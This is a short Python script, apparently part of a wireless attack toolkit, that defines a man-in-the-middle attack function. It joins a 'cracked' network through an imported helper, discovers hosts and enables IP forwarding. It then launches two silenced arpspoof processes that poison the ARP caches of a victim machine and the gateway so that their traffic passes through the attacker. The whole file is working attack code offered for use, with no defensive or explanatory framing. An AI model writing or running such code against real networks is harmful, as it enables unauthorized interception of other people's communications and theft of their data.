import subprocess
from HostDiscovery import device_discovery
from ConnectCrackedNetwork import connect_to_cracked_network


def man_in_middle_attack():
    connect_to_cracked_network()
    device_discovery()


    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])

    command1 = ["arpspoof", "-i", "wlan0", "-t", "192.168.10.3", "192.168.10.1"]
    command2 = ["arpspoof", "-i", "wlan0", "-t", "192.168.10.1", "192.168.10.3"]

    subprocess.Popen(command1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.Popen(command2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


